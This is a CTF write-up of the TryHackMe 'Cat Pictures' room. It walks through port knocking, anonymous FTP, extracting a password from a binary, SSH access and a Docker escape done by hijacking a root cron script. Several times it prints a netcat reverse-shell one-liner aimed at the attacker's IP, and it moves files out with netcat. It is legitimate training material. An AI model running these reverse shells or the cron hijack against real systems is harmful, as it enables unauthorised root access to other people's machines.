## Machine Information

![catpics](/assets/images/2021-06-07-21-31-17.png)

Cat Pictures is an easy difficulty room on TryHackMe. Our initial scan reveals several open and filtered ports. We find phpBB running on one of them, from there we find clues to a port knocking sequence which opens an anonymous FTP service. We find credentials to access a custom shell running on another port, which leads us to a password protected executable. A hexdump reveals a password, and the output is a private RSA key. We use this to access a docker container via SSH. From there we escape to the underlying host to gain our final flag. As you can see this one is quite a fun ride!

Skills required are basic file and operating system enumeration and exploration knowledge. Skills gained are methods of port knocking and escaping shells and containers.

## Initial Recon

As always let's start with Nmap:

```

Our initial scan reveals several ports. We can see FTP on port 21 is being filtered by a firewall, as is docker on port 2375. We have SSH on port 22 and Apache running on port 8080. There's also something on port 4420, the fingerprint of the service suggests it's some sort of internal shell.

First let's add the server IP to our hosts file:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# echo 10.10.158.78 catpics.thm >> /etc/hosts
```

## phpBB

We'll start with port 8080 and see if there is a website to look around:

![catpics-phpbb](/assets/images/2021-06-06-17-44-22.png)

We find a bulletin board set up for us to share our cat pictures. Nice!

Disappointingly when we look around we find there is only one post:

![catpics-post](/assets/images/2021-06-06-17-45-29.png)

This is a clear clue that we need to use port knocking to progress. I've covered this before on the [HTB Machine Nineveh](https://pencer.io/ctf/ctf-htb-nineveh), there's also a good detailed article [here](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt) that explains how to set up your own knockd service and access it.

## Port Knocking

If we look back at our earlier scan we found two ports, 21 and 2375, that were filtered. It's a good bet that one or both will be opened by knocking. Let's get to it, first using the same method as I did on Nineveh using nmap:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# for x in <HIDDEN>; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x catpics.thm; done

We could also install the knockd tools, which includes knock which we use instead:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# knock

```

Either way once we've knocked, let's do another port scan and see if anything changed:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# nmap -p$ports -sC -sV -oA catpics 10.10.158.78

```

## Anonymous FTP

We now see port 21 hosting FTP has opened, and there is anonymous logins allowed. Let's go look at the file the scan found:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# ftp catpics.thm
Connected to catpics.thm.

226 Transfer complete.

```

## Internal Shell

We've found credentials for the service we saw earlier running on port 4420. Let's give it a go:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# nc -v catpics.thm 4420
catpics.thm [10.10.158.78] 4420 (?) open
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
<HIDDEN>
Password accepted
```

That worked and we're in the server but with a limited shell. A quick look around shows there is very little exposed to us, I do find this though:

```text
ls -l home
drwxr-xr-x 2 0 0 4096 Apr  3 01:34 catlover

ls -l home/catlover
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
```

However trying to run it give us this message:

```text
home/catlover/runme
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

Time to upgrade to a better shell. One that I use often is from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

This one seems to be pretty reliable. Let's check we have the needed commands:

```text
ls -l
drwxrwxr-x 2 1001 1001 4096 Apr  2 23:05 bin
drwxr-xr-x 2    0    0 4096 Apr  1 20:32 etc
drwxr-xr-x 3    0    0 4096 Apr  2 20:51 home
drwxr-xr-x 3    0    0 4096 Apr  2 22:53 lib
drwxr-xr-x 2    0    0 4096 Apr  1 20:28 lib64
drwxr-xr-x 2    0    0 4096 Apr  2 20:56 opt
drwxr-xr-x 2    0    0 4096 Apr  3 01:35 tmp
drwxr-xr-x 4    0    0 4096 Apr  2 22:43 usr

ls -l bin
-rwxr-xr-x 1 1001 1001 1113504 Apr  1 20:32 bash
-rwxr-xr-x 1    0    0   35064 Apr  1 20:32 cat
-rwxr-xr-x 1    0    0   35000 Apr  1 20:32 echo
-rwxr-xr-x 1    0    0  133792 Apr  1 20:32 ls
-rwxr-xr-x 1    0    0   35312 Apr  2 23:05 nc
-rwxr-xr-x 1    0    0   63704 Apr  1 20:32 rm
-rwxr-xr-x 1    0    0  121432 Apr  1 20:37 sh

ls -l usr
drwxr-xr-x 2 0 0 4096 Apr  3 01:31 bin
drwxr-xr-x 2 0 0 4096 Apr  2 22:53 lib

ls -l usr/bin
-rwxr-xr-x 1 0 0  63672 Apr  3 01:20 mkfifo
-rwxr-xr-x 1 0 0  88280 Apr  3 01:31 touch
-rwxr-xr-x 1 0 0 499264 Apr  2 22:43 wget
```

Having looked we can see all the needed commands are there, let's give it a go:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.165.116 1234 >/tmp/f
```

Switch to a waiting netcat session to see we have caught the shell:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# nc -nlvp 1234       
listening on [any] 1234 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.91.88] 59310
/bin/sh: 0: can't access tty; job control turned off
#
```

## Custom Executable

Ok, let's try the executable again:

```text
# cd /home/catlover
# ls -l
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
# ./runme
Please enter yout password: 12345
Access Denied
```

So we can run the executable, but still need to find a password. The next logical step here is to copy the file to my Kali machine and analyse it.  

On Kali we start a new netcat session listening on a spare port and tell it to redirect what is sent to it to a file:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# nc -nlvp 443 > runme
listening on [any] 443 ...
```

Now back on the server we send the file to Kali by redirecting it using netcat that is on there:

```text
# nc 10.8.165.116 443 < home/catlover/runme
```

Switch back to Kali, ctrl-c to close the session and we will have the file:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# nc -nlvp 443 > runme
listening on [any] 443 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.91.88] 38002
^C

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# ls -l
-rw-r--r-- 1 root root 18856 Jun  6 22:10 runme

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# chmod +x runme

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# ./runme                                                          
Please enter yout password: 12345
Access Denied
```

## Hexdump

Ok, we have the file and can confirm it runs. Now we need to analyse it, and there are many different ways to achieve this on Linux. I used hexdump and grep to look for the word **password** as we know from the output when we run it that the word exists:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# hexdump -C runme | grep -B 5 -A 5 password
00001650  48 83 c4 08 c3 00 00 00  00 00 00 00 00 00 00 00  |H...............|

```

## Strings

We could also use strings for a similar result:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# strings runme | grep -B5 -A5 password  
u+UH
ATSH
[A\]
[]A\A]A^A_
<HIDDEN>
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
:*3$"
zPLR
```

Either way we have a suspected password so let's try it:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# ./runme
Please enter yout password: <HIDDEN>
Welcome, catlover! SSH key transfer queued!
```

We find a file created in our tmp folder:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# ls -lsa /tmp/gibmethesshkey 
0 -rw-r--r-- 1 root root 0 Jun  6 22:19 /tmp/gibmethesshkey
```

It's 0 bytes, so doesn't reveal anything. Let's try it on the server now we have the password:

```text
# ./runme
Please enter yout password: <HIDDEN>
Welcome, catlover! SSH key transfer queued! 

# ls -l
total 24
-rw-r--r-- 1 0 0  1675 Jun  6 21:28 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
```

We now have an id_rsa file containing a private key for catlover:

```text
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----

```

## SSH Access

Copying this and pasting to a file on Kali let's us use it to log in to the server via SSH on port 22:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# chmod 600 id_rsa

â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]

We're in, and looks like the root user:

```text
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We can grab the first flag:

```text
root@7546fa2336d6:/# ls /root
flag.txt
root@7546fa2336d6:/# cat /root/flag.txt 
<HIDDEN>
```

## Escaping Container

However looking around it's clear we are not actually root on the server, but instead we are inside a Docker container. [This](https://stackoverflow.com/questions/20010199/how-to-determine-if-a-process-runs-inside-lxc-docker#:~:text=The%20most%20reliable%20way%20is,name%20of%20the%20anchor%20point.) article has a few useful ways to check this, I used one here:

```text
root@7546fa2336d6:/opt/clean# grep 'docker\|lxc' /proc/1/cgroup
12:perf_event:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
11:hugetlb:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a

8:devices:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
7:cpuset:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a

5:memory:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
4:freezer:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
3:pids:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
2:blkio:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
1:name=systemd:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
```

So we still need to find the final flag, and to achieve that we need to escape the container. After looking around more I notice something interesting:

```text
root@7546fa2336d6:/# mount
<SNIP>
/dev/xvda1 on /bitnami/phpbb type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /opt/clean type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

What is this xvda1 partition? DF also shows us it is mounted on /opt/clean:

```text
root@7546fa2336d6:/# df
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay         20509264 7607468  11836940  40% /

tmpfs             243280       0    243280   0% /proc/acpi
tmpfs             243280       0    243280   0% /proc/scsi
tmpfs             243280       0    243280   0% /sys/firmware
```

When we look in that folder we find just one file:

```text
root@7546fa2336d6:/# cd /opt/clean

root@7546fa2336d6:/opt/clean# ls -lsa
4 drwxr-xr-x 2 root root 4096 May  1 00:20 .
8 drwxrwxr-x 1 root root 4096 Mar 25 16:08 ..
4 -rw-r--r-- 1 root root   27 May  1 00:20 clean.sh

root@7546fa2336d6:/opt/clean# cat clean.sh 
#!/bin/bash
rm -rf /tmp/*
```

So we have a batch file that is clearing out anything in the /tmp folder. As that file is running from the mount point, then we can assume it is the host systems /tmp folder, not the one here in the container. To test this we can create a file in /tmp and see if it is deleted:

```text
root@7546fa2336d6:/opt/clean# touch /tmp/pencer

root@7546fa2336d6:/opt/clean# ls -l /tmp
-rw-r--r-- 1 root root 0 Jun  6 21:56 pencer

root@7546fa2336d6:/opt/clean# date
Sun Jun  6 21:56:24 UTC 2021

root@7546fa2336d6:/opt/clean# date
Sun Jun  6 22:02:09 UTC 2021

root@7546fa2336d6:/opt/clean# ls -l /tmp
total 0
-rw-r--r-- 1 root root 0 Jun  6 21:56 pencer
```

My file is still there, which to me suggests either there is no cronjob running on the host, or the /tmp it is cleaning is not the one local to me.

We have write permissions to the file so why not try changing it to firing a reverse shell at us? I know the one I used earlier worked, so let's use the same again but with a different port:

```text
root@7546fa2336d6:/opt/clean# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.165.116 4444 >/tmp/f" > /opt/clean/clean.sh
```

Now we wait, and eventually I get a connection to my new netcat listener:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/catpics]
â””â”€# nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.161.99] 53580
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

# hostname
cat-pictures
```

I'm root, this time on the host server. Let's grab the flag:

```text
# ls /root
firewall
root.txt

# cat /root/root.txt
Congrats!!!
Here is your flag:
<HIDDEN>
```

## Root+1

I'm curious about that clean script, so just to scratch that itch let's check the crontab on the server:

```text
# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/2 * * * * root /bin/bash /opt/clean/clean.sh >/dev/null 2>&1
* * * * * root /bin/sleep 20; /usr/bin/python3 /opt/sshkeyfetcher/fetch.py >/dev/null 2>&1
```

As expected there is a cronjob that runs the clean.sh script every 2 minutes. [This](https://crontab.guru/every-2-minutes) is a good site if you need help deciphering cron schedules.

I hope you enjoyed this easy machine. And thanks to [gamercat](https://tryhackme.com/p/gamercat) and [TryHackMe](https://tryhackme.com/) for providing this free to the community.

For now we are all done. See you next time.
